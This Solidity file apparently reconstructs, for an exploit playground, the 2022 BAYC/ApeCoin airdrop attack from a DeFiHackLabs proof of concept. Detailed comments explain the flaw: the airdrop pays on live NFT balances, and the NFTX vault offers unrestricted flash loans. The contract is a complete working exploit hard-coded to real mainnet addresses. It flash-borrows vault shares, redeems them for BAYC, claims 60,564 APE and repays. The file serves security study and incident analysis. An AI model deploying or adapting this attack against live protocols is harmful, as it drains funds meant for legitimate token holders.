// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-05-Bayc_apecoin).
//
// The DeFiHackLabs PoC (test/Bayc_apecoin_exp.sol) runs the attack INLINE in the
// Foundry test contract `ContractTest`: the ERC-3156 `onFlashLoan` callback and
// the `onERC721Received` hook live on the test itself, and the seed BAYC #1060 is
// `transferFrom`-ed in by a `vm.startPrank`'d holder EOA. There is no standalone
// contract to deploy, so the playground cannot point at a real exploit artifact.
//
// This contract is a faithful, self-contained copy of that inline attack: the
// `test()` body becomes `attack()`, and the two callbacks are preserved verbatim.
// Logic and constants are copied from the registry test. It is compiled inside the
// registry forge project (no forge-std / interface.sol imports) so it resolves the
// same on-chain bytecode as the original.
//
// Root cause: ApeCoin's `AirdropGrapesToken.claimTokens()` pays the airdrop based
// on a LIVE `ERC721Enumerable.balanceOf(msg.sender)` of BAYC, with no flash-loan
// awareness and no snapshot. The NFTX BAYC vault is an ERC-3156 flash-lender whose
// share token is 1:1 redeemable for real BAYC, and its `flashLoan` callback is
// unrestricted — so an attacker flash-borrows vault shares, redeems them for real
// BAYC, claims the airdrop while transiently owning those BAYC, then re-mints the
// shares (returning the BAYC) to repay. Net: the vault is made whole, but the
// attacker keeps 60,564 APE.

// VULNERABILITY: Live-balance airdrop claim without snapshot + unrestricted flash-mint redeem on NFT vault
// Detailed: AirdropGrapesToken.claimTokens relies on instantaneous ERC721Enumerable.balanceOf(msg.sender)
// (for beta/alpha) and repeated tokenOfOwnerByIndex + !claimed[tokenId] checks inside getClaimable... .
// No checkpoint/snapshot at claim start, claim period only checked by timestamp. This is exploitable
// because NFTXVault (for BAYC) allows anyone to flashLoan its own shares (ERC20FlashMint: mints to receiver,
// zero fee), redeem burns shares to pull real BAYC to receiver, and mint allows returning them to restore shares.
// All within one tx/callback with no guards. Attacker uses 1 seeded BAYC + flash 5 to claim for 6.
// (Preconditions: claim active/not paused; vault holds sufficient BAYC; target NFTs unclaimed.)
// The flaw is the combination of "pay on current ownership" + "flashable ownership of the collateral".

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IBAYC {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool approved) external;
}

interface IAirdrop {
    function claimTokens() external;
}

interface INFTXVault {
    function approve(address spender, uint256 amount) external returns (bool);
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
    function redeem(uint256 amount, uint256[] calldata specificIds) external returns (uint256[] memory);
    function mint(uint256[] calldata tokenIds, uint256[] calldata amounts) external returns (uint256);
}

contract BaycApecoinDrain {
    address constant BAYC = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
    address constant NFTX_VAULT = 0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5;
    address constant AIRDROP = 0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    // The 5 BAYC the attacker flash-redeems from the vault are returned by a random
    // redeem (empty specificIds), so their tokenIds are not known up-front. The PoC
    // records the exact ids from the original trace and re-deposits them together
    // with the seeded #1060 to repay. (The airdrop pays a flat per-BAYC rate, so the
    // specific ids do not affect the payout — only the count of 6 matters.)
    uint256[] private redeemedIds;

    function attack() external {
        // EXPLOIT STEP 1: Max-approve the vault's share token (the flash-loaned asset) so that
        // after callback the flashLoan impl's allowance check passes for the burn repayment.
        // (See ERC20FlashMint.flashLoan which does _mint then requires allowance >= amount+fee).
        INFTXVault(NFTX_VAULT).approve(NFTX_VAULT, type(uint256).max);

        // EXPLOIT STEP 2: Trigger the flash loan. This mints 5.2 shares to this contract temporarily,
        // invokes onFlashLoan, then (after success return) burns the shares using the allowance.
        // Flash fee is 0. No other preconditions.
        INFTXVault(NFTX_VAULT).flashLoan(address(this), NFTX_VAULT, 5_200_000_000_000_000_000, "");
    }

    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
        uint256[] memory blank = new uint256[](0);

        // VULNERABILITY: Unrestricted ERC3156 flash-mint of vault shares + airdrop using live NFT balanceOf
        // Root cause is in AirdropGrapesToken.claimTokens() (and internal getClaimableTokenAmountAndGammaToClaim):
        // it gates and sizes the payout solely on live `beta.balanceOf(msg.sender) > 0` + loops over
        // `alpha.balanceOf(msg.sender)`, `beta.balanceOf...`, `gamma.balanceOf...` + tokenOfOwnerByIndex
        // to count/mark unclaimed tokens. No snapshot at claimStartTime, no flash-loan guard.
        // The NFTX vault share (1:1 BAYC) implements flashLoan (inherited ERC20FlashMint) by directly
        // `_mint(receiver, amount)` (fee=0), lets receiver call redeem (which does `_burn(msg.sender, ...)` +
        // withdrawNFTsTo transferring real BAYC), then after callback `_burn`s the shares.
        // Callback is fully open (anyone can flash, use the transient shares for redeem+claim+mint).
        // In onFlashLoan the attacker holds the NFTs only for the duration of the tx.
        // (See airdrop: claimTokens:108 require+loops, getClaimable:150, NFTX: flashLoan:985 (_mint+callback),
        // redeemTo:2110 (_burn+withdraw), mintTo:2074 (receiveNFTs + _mint shares), flashFee:960=0.)
        // Impact: Drains airdrop APE (60,564 here for 6 BAYC @~10k each) from the distributor to attacker.
        // Intended recipients (snapshot BAYC holders) lose their pro-rata share of the airdrop pool.
        // NFTX vault and its depositors suffer no loss (shares returned, NFTs returned). Atomic, permissionless.

        // EXPLOIT STEP 3 (in onFlashLoan): Burn 5 of the flash-minted shares via redeem(5, []).
        // redeem burns shares from this (the receiver) and transfers 5 BAYC NFTs (random, since blank ids)
        // to this contract. At this point + seeded #1060 we hold 6 BAYC live.
        redeemedIds = INFTXVault(NFTX_VAULT).redeem(5, blank);

        // EXPLOIT STEP 4: Extract the airdrop using the transient 6 BAYC balance.
        // Owning 6 BAYC at this instant lets the attacker claim 6 × 10,094 = 60,564 APE.
        IAirdrop(AIRDROP).claimTokens();

        // EXPLOIT STEP 5: setApprovalForAll on BAYC so the vault can pull the 6 NFTs via
        // safeTransferFrom inside receiveNFTs during the mint below.
        IBAYC(BAYC).setApprovalForAll(NFTX_VAULT, true);

        // Re-deposit all 6 BAYC (the 5 redeemed + #1060): mints 6e18 shares back,
        // covering the 5 burned above and repaying the flash principal + fee.
        uint256[] memory nfts = new uint256[](6);
        nfts[0] = redeemedIds[0];
        nfts[1] = redeemedIds[1];
        nfts[2] = redeemedIds[2];
        nfts[3] = redeemedIds[3];
        nfts[4] = redeemedIds[4];
        nfts[5] = 1060;
        INFTXVault(NFTX_VAULT).mint(nfts, blank);

        // EXPLOIT STEP 6: Re-approve vault shares post-mint. This is required because the flashLoan
        // after onFlashLoan returns will do `_approve(..., current - amount - fee)` then _burn.
        // Re-approve so the vault can burn principal + fee after the callback returns.
        INFTXVault(NFTX_VAULT).approve(NFTX_VAULT, type(uint256).max);

        return CALLBACK_SUCCESS;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
